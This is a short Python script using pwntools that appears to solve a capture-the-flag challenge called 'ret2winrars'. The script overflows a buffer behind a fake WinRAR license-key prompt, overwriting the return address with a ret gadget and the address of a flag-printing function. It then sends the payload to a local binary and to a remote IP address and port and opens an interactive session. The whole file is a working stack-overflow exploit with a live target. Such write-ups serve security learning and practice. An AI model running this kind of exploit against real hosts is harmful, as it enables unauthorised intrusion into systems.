from pwn import *

BIN = './ret2winrars'

flag = 0x0000000000401162
ret = 0x0000000000401016

def exploit():
	payload = b'a'*0x20 + b'b'*8 + p64(ret) + p64(flag)
	io.recvuntil("Please enter your WinRaR license key to get access:")
	io.sendline(payload)
	io.interactive()

io = process(BIN)
io = remote("193.57.159.27",20828)
exploit()